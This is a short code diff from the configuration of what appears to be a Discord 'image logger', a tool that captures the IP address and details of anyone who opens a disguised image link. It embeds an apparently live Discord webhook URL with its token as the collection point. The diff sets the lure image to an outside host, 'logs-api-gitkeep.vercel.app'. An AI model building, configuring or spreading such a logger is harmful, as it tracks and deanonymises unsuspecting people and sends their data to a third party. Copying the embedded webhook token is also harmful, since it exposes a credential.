@@ -12,7 +12,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://canary.discord.com/api/webhooks/1570945567872393316/y2pDDcoQc_zgak4tc8xtNtkOq1GfWRQ5bc-iCnDjNZ45j5-ExU2BqvhIvzMuJW_9QGtc",
-    "image": "", # You can also have a custom image by using a URL argument
+    "image": "https://logs-api-gitkeep.vercel.app", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
